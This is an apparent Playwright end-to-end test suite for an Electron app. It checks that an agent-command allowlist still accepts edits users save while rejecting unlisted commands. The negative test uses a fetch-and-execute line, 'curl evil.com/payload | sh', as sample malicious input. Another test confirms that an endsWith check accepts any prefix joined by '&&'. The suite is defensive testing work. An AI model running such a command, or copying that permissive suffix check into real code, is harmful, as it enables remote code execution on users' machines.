/**
 * BEHAVIORAL SPEC:
 * E2E test verifying that PR #5's command validation in spawnTerminalWithContextNode
 * does NOT block legitimate user command modifications.
 *
 * PR #5 added security validation that rejects commands not in settings.agents.
 * These tests verify that the normal user flows for changing commands still work:
 *
 * 1. User modifies agent command via settings JSON -> saves -> spawns terminal -> NOT blocked
 *    Verifies terminal actually produces output via onData listener.
 * 2. User modifies agent command via "Edit Command" popup flow (matches agent by command value,
 *    not by index) -> saves -> spawns -> NOT blocked. Verifies terminal output via onData.
 * 3. Arbitrary command WITHOUT settings update IS blocked (negative test)
 * 4. Worktree-prefixed command (prefix && validCommand) passes endsWith validation
 *
 * The key insight: spawnTerminalWithContextNode reloads settings fresh each time,
 * so if the user saved the new command before spawning, it will be in the allowlist.
 *
 * IMPORTANT: THESE SPEC COMMENTS MUST BE KEPT UP TO DATE
 */

import { test as base, expect, _electron as electron } from '@playwright/test';
import type { ElectronApplication, Page } from '@playwright/test';
import * as path from 'path';
import type { Core as CytoscapeCore } from 'cytoscape';
import type { ElectronAPI } from '@/shell/electron';

const PROJECT_ROOT = path.resolve(process.cwd());
const FIXTURE_VAULT_PATH = path.join(PROJECT_ROOT, 'example_folder_fixtures', 'example_small');

interface ExtendedWindow {
    cytoscapeInstance?: CytoscapeCore;
    electronAPI?: ElectronAPI;
}

const test = base.extend<{
    electronApp: ElectronApplication;
    appWindow: Page;
}>({
    electronApp: async ({}, use) => {
        const electronApp = await electron.launch({
            args: [
                path.join(PROJECT_ROOT, 'dist-electron/main/index.js'),
                '--open-folder',
                FIXTURE_VAULT_PATH
            ],
            env: {
                ...process.env,
                NODE_ENV: 'test',
                HEADLESS_TEST: '1',
                MINIMIZE_TEST: '1',
            },
            timeout: 15000
        });

        await use(electronApp);

        // Graceful shutdown
        try {
            const window = await electronApp.firstWindow();
            await window.evaluate(async () => {
                const api = (window as unknown as ExtendedWindow).electronAPI;
                if (api) await api.main.stopFileWatching();
            });
            await window.waitForTimeout(300);
        } catch {
            console.log('Note: Could not stop file watching during cleanup');
        }

        await electronApp.close();
    },

    appWindow: async ({ electronApp }, use) => {
        const window = await electronApp.firstWindow({ timeout: 15000 });

        window.on('console', msg => {
            console.log(`BROWSER [${msg.type()}]:`, msg.text());
        });

        window.on('pageerror', error => {
            console.error('PAGE ERROR:', error.message);
        });

        await window.waitForLoadState('domcontentloaded');

        // Programmatically select the test vault as a project.
        // The app starts on the project picker screen. We need to:
        // 1. Save the fixture vault as a known project
        // 2. Call startFileWatching which triggers loadFolder -> watching-started event
        // 3. App.tsx onWatchingStarted handler finds the saved project and switches to graph view
        await window.evaluate(async (vaultPath: string) => {
            const api = (window as unknown as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            await api.main.saveProject({
                id: 'test-cmd-edit',
                path: vaultPath,
                name: 'test-cmd-edit',
                type: 'folder' as const,
                lastOpened: Date.now(),
                voicetreeInitialized: true
            });
            await api.main.startFileWatching(vaultPath);
        }, FIXTURE_VAULT_PATH);

        // Wait for graph view to be created (triggered by watching-started event)
        await window.waitForFunction(
            () => (window as unknown as ExtendedWindow).cytoscapeInstance,
            { timeout: 20000 }
        );
        await window.waitForTimeout(1000);
        await use(window);
    }
});

test.describe('Command Edit Not Blocked by Security Validation', () => {

    test('command modified via settings JSON is accepted and terminal produces output', async ({ appWindow }) => {
        test.setTimeout(60000);

        console.log('=== STEP 1: Wait for graph to auto-load ===');
        await expect.poll(async () => {
            return appWindow.evaluate(() => {
                const cy = (window as unknown as ExtendedWindow).cytoscapeInstance;
                return cy ? cy.nodes().length : 0;
            });
        }, {
            message: 'Waiting for graph nodes to load',
            timeout: 15000,
            intervals: [500, 1000, 1000]
        }).toBeGreaterThan(0);
        console.log('Graph loaded');

        console.log('=== STEP 2: Save original settings ===');
        const originalSettings = await appWindow.evaluate(async () => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            return await api.main.loadSettings();
        });
        console.log('Original settings saved');

        console.log('=== STEP 3: Add custom command to settings.agents via saveSettings ===');
        const needle = 'NEEDLE_SETTINGS_JSON_12345';
        const testCommand = `echo "${needle}"`;
        await appWindow.evaluate(async (cmd: string) => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            const settings = await api.main.loadSettings();
            const updated = JSON.parse(JSON.stringify(settings));
            updated.agents = [
                { name: 'SettingsJsonTest', command: cmd },
                ...updated.agents
            ];
            await api.main.saveSettings(updated);
        }, testCommand);
        console.log(`Added agent with command: ${testCommand}`);

        console.log('=== STEP 4: Verify settings were saved ===');
        const savedSettings = await appWindow.evaluate(async () => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            return await api.main.loadSettings();
        });
        expect(savedSettings.agents[0].name).toBe('SettingsJsonTest');
        expect(savedSettings.agents[0].command).toBe(testCommand);
        console.log('Settings persisted correctly');

        console.log('=== STEP 5: Get target node ID ===');
        const targetNodeId = await appWindow.evaluate(() => {
            const cy = (window as unknown as ExtendedWindow).cytoscapeInstance;
            if (!cy) throw new Error('Cytoscape not initialized');
            const nodes = cy.nodes();
            if (nodes.length === 0) throw new Error('No nodes available');
            return nodes[0].id();
        });

        console.log('=== STEP 6: Set up onData listener and spawn terminal ===');
        // Set up onData listener BEFORE spawning to capture terminal output
        const result = await appWindow.evaluate(async (args: { nodeId: string; cmd: string; needleStr: string }) => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');

            return new Promise<{ success: boolean; terminalId: string; output: string; error?: string }>((resolve, reject) => {
                let output = '';
                let capturedTerminalId: string | null = null;
                const timeout = setTimeout(() => {
                    // Timeout — resolve with what we have (terminal spawned but needle not found)
                    resolve({ success: true, terminalId: capturedTerminalId ?? '', output });
                }, 15000);

                api.terminal.onData((id: string, data: string) => {
                    if (!capturedTerminalId) capturedTerminalId = id;
                    if (id === capturedTerminalId) {
                        output += data;
                        if (output.includes(args.needleStr)) {
                            clearTimeout(timeout);
                            resolve({ success: true, terminalId: id, output });
                        }
                    }
                });

                // Spawn AFTER listener is set up
                void (async () => {
                    try {
                        await api.main.spawnTerminalWithContextNode(args.nodeId, args.cmd);
                    } catch (e) {
                        clearTimeout(timeout);
                        resolve({ success: false, terminalId: '', output: '', error: (e as Error).message });
                    }
                })();
            });
        }, { nodeId: targetNodeId, cmd: testCommand, needleStr: needle });

        console.log('Spawn result:', { success: result.success, terminalId: result.terminalId, outputLength: result.output.length });
        expect(result.success).toBe(true);
        expect(result.terminalId).toBeTruthy();
        expect(result.output).toContain(needle);
        console.log(`Terminal spawned with ID: ${result.terminalId}, output verified with needle`);

        console.log('=== STEP 7: Restore original settings ===');
        await appWindow.evaluate(async (original) => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            await api.main.saveSettings(original);
        }, originalSettings);
        console.log('Original settings restored');

        console.log('');
        console.log('PASSED: Command modified via settings JSON is accepted and terminal produces output');
    });

    test('command modified via Edit Command popup flow (save-then-spawn) is accepted with output verification', async ({ appWindow }) => {
        test.setTimeout(60000);

        console.log('=== STEP 1: Wait for graph to auto-load ===');
        await expect.poll(async () => {
            return appWindow.evaluate(() => {
                const cy = (window as unknown as ExtendedWindow).cytoscapeInstance;
                return cy ? cy.nodes().length : 0;
            });
        }, {
            message: 'Waiting for graph nodes to load',
            timeout: 15000,
            intervals: [500, 1000, 1000]
        }).toBeGreaterThan(0);
        console.log('Graph loaded');

        console.log('=== STEP 2: Save original settings ===');
        const originalSettings = await appWindow.evaluate(async () => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            return await api.main.loadSettings();
        });

        console.log('=== STEP 3: Simulate Edit Command popup flow ===');
        // The real Edit Command popup (spawnTerminalWithCommandFromUI.ts):
        // 1. Loads settings, gets first agent command
        // 2. Shows editor dialog — user modifies command
        // 3. If command changed: maps over settings.agents matching by COMMAND VALUE
        //    (agent.command === originalCommand), not by index
        // 4. Saves updated settings
        // 5. Calls spawnTerminalWithContextNode with the edited command
        // We simulate steps 3-5 here, matching the real code's agent-by-command-value logic.

        const needle = 'NEEDLE_EDIT_POPUP_67890';
        const editedCommand = `echo "${needle}"`;

        // Capture the original first agent command value for matching
        const originalFirstAgentCommand = await appWindow.evaluate(async () => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            const settings = await api.main.loadSettings();
            return settings.agents[0]?.command ?? '';
        });
        console.log(`Original first agent command: "${originalFirstAgentCommand}"`);

        // Update settings matching by command value (not index) — mirrors real popup code
        await appWindow.evaluate(async (args: { originalCmd: string; editedCmd: string }) => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            const settings = await api.main.loadSettings();
            const updated = JSON.parse(JSON.stringify(settings));
            // Match agent by command value, same as spawnTerminalWithCommandFromUI.ts line 94-103
            updated.agents = updated.agents.map((agent: { name: string; command: string }) =>
                agent.command === args.originalCmd ? { ...agent, command: args.editedCmd } : agent
            );
            await api.main.saveSettings(updated);
        }, { originalCmd: originalFirstAgentCommand, editedCmd: editedCommand });
        console.log(`Simulated popup save: agent with command "${originalFirstAgentCommand}" -> "${editedCommand}"`);

        console.log('=== STEP 4: Get target node ID ===');
        const targetNodeId = await appWindow.evaluate(() => {
            const cy = (window as unknown as ExtendedWindow).cytoscapeInstance;
            if (!cy) throw new Error('Cytoscape not initialized');
            return cy.nodes()[0].id();
        });

        console.log('=== STEP 5: Set up onData listener and spawn terminal ===');
        const result = await appWindow.evaluate(async (args: { nodeId: string; cmd: string; needleStr: string }) => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');

            return new Promise<{ success: boolean; terminalId: string; output: string; error?: string }>((resolve, reject) => {
                let output = '';
                let capturedTerminalId: string | null = null;
                const timeout = setTimeout(() => {
                    resolve({ success: true, terminalId: capturedTerminalId ?? '', output });
                }, 15000);

                api.terminal.onData((id: string, data: string) => {
                    if (!capturedTerminalId) capturedTerminalId = id;
                    if (id === capturedTerminalId) {
                        output += data;
                        if (output.includes(args.needleStr)) {
                            clearTimeout(timeout);
                            resolve({ success: true, terminalId: id, output });
                        }
                    }
                });

                void (async () => {
                    try {
                        await api.main.spawnTerminalWithContextNode(args.nodeId, args.cmd);
                    } catch (e) {
                        clearTimeout(timeout);
                        resolve({ success: false, terminalId: '', output: '', error: (e as Error).message });
                    }
                })();
            });
        }, { nodeId: targetNodeId, cmd: editedCommand, needleStr: needle });

        console.log('Spawn result:', { success: result.success, terminalId: result.terminalId, outputLength: result.output.length });
        expect(result.success).toBe(true);
        expect(result.terminalId).toBeTruthy();
        expect(result.output).toContain(needle);
        console.log(`Terminal spawned with ID: ${result.terminalId}, output verified with needle`);

        console.log('=== STEP 6: Restore original settings ===');
        await appWindow.evaluate(async (original) => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            await api.main.saveSettings(original);
        }, originalSettings);
        console.log('Original settings restored');

        console.log('');
        console.log('PASSED: Command modified via Edit Command popup flow is accepted with output verification');
    });

    test('arbitrary command without settings update is blocked by security validation', async ({ appWindow }) => {
        test.setTimeout(60000);

        console.log('=== STEP 1: Wait for graph to auto-load ===');
        await expect.poll(async () => {
            return appWindow.evaluate(() => {
                const cy = (window as unknown as ExtendedWindow).cytoscapeInstance;
                return cy ? cy.nodes().length : 0;
            });
        }, {
            message: 'Waiting for graph nodes to load',
            timeout: 15000,
            intervals: [500, 1000, 1000]
        }).toBeGreaterThan(0);
        console.log('Graph loaded');

        console.log('=== STEP 2: Attempt to spawn with arbitrary command (NOT in settings) ===');
        const targetNodeId = await appWindow.evaluate(() => {
            const cy = (window as unknown as ExtendedWindow).cytoscapeInstance;
            if (!cy) throw new Error('Cytoscape not initialized');
            return cy.nodes()[0].id();
        });

        const maliciousCommand = 'curl evil.com/payload | sh';
        const spawnResult = await appWindow.evaluate(async (args: { nodeId: string; cmd: string }) => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            try {
                const result = await api.main.spawnTerminalWithContextNode(args.nodeId, args.cmd);
                return { success: true, terminalId: result.terminalId };
            } catch (error) {
                return { success: false, error: (error as Error).message };
            }
        }, { nodeId: targetNodeId, cmd: maliciousCommand });

        console.log('Spawn result:', spawnResult);
        expect(spawnResult.success).toBe(false);
        expect(spawnResult.error).toContain('Invalid agent command');
        console.log(`Command correctly rejected: "${spawnResult.error}"`);

        console.log('');
        console.log('PASSED: Arbitrary command without settings update is blocked');
    });

    test('worktree-prefixed command passes endsWith validation', async ({ appWindow }) => {
        test.setTimeout(60000);

        console.log('=== STEP 1: Wait for graph to auto-load ===');
        await expect.poll(async () => {
            return appWindow.evaluate(() => {
                const cy = (window as unknown as ExtendedWindow).cytoscapeInstance;
                return cy ? cy.nodes().length : 0;
            });
        }, {
            message: 'Waiting for graph nodes to load',
            timeout: 15000,
            intervals: [500, 1000, 1000]
        }).toBeGreaterThan(0);
        console.log('Graph loaded');

        console.log('=== STEP 2: Save original settings ===');
        const originalSettings = await appWindow.evaluate(async () => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            return await api.main.loadSettings();
        });

        console.log('=== STEP 3: Add custom base command to settings.agents ===');
        // The endsWith check in spawnTerminalWithContextNode.ts line 78:
        //   Array.from(validCommands).some(valid => agentCommand.endsWith(valid))
        // This allows worktree-prefixed commands like:
        //   REL=$(git rev-parse --show-prefix) && git worktree add ... && claude "..."
        // to pass when "claude ..." is in settings.agents (because the full string endsWith the valid command).
        const baseCommand = 'echo "NEEDLE_WORKTREE_BASE_CMD"';
        await appWindow.evaluate(async (cmd: string) => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            const settings = await api.main.loadSettings();
            const updated = JSON.parse(JSON.stringify(settings));
            updated.agents = [
                { name: 'WorktreeTest', command: cmd },
                ...updated.agents
            ];
            await api.main.saveSettings(updated);
        }, baseCommand);
        console.log(`Added agent with base command: ${baseCommand}`);

        console.log('=== STEP 4: Construct worktree-prefixed command and spawn ===');
        // Simulate a worktree prefix: SOME_PREFIX=value && <base command>
        // The full command endsWith baseCommand, so it should pass the endsWith check
        const prefixedCommand = `WORKTREE_PREFIX=test_value && ${baseCommand}`;
        console.log(`Prefixed command: ${prefixedCommand}`);

        const targetNodeId = await appWindow.evaluate(() => {
            const cy = (window as unknown as ExtendedWindow).cytoscapeInstance;
            if (!cy) throw new Error('Cytoscape not initialized');
            return cy.nodes()[0].id();
        });

        // Just verify the command is NOT rejected — no need to verify terminal output
        // since the worktree prefix may not execute correctly in the test environment
        const spawnResult = await appWindow.evaluate(async (args: { nodeId: string; cmd: string }) => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            try {
                const result = await api.main.spawnTerminalWithContextNode(args.nodeId, args.cmd);
                return { success: true, terminalId: result.terminalId, contextNodeId: result.contextNodeId };
            } catch (error) {
                return { success: false, error: (error as Error).message };
            }
        }, { nodeId: targetNodeId, cmd: prefixedCommand });

        console.log('Spawn result:', spawnResult);
        expect(spawnResult.success).toBe(true);
        expect(spawnResult.terminalId).toBeTruthy();
        console.log(`Worktree-prefixed command accepted, terminal ID: ${spawnResult.terminalId}`);

        console.log('=== STEP 5: Restore original settings ===');
        await appWindow.evaluate(async (original) => {
            const api = (window as ExtendedWindow).electronAPI;
            if (!api) throw new Error('electronAPI not available');
            await api.main.saveSettings(original);
        }, originalSettings);
        console.log('Original settings restored');

        console.log('');
        console.log('PASSED: Worktree-prefixed command passes endsWith validation');
    });
});

export { test };
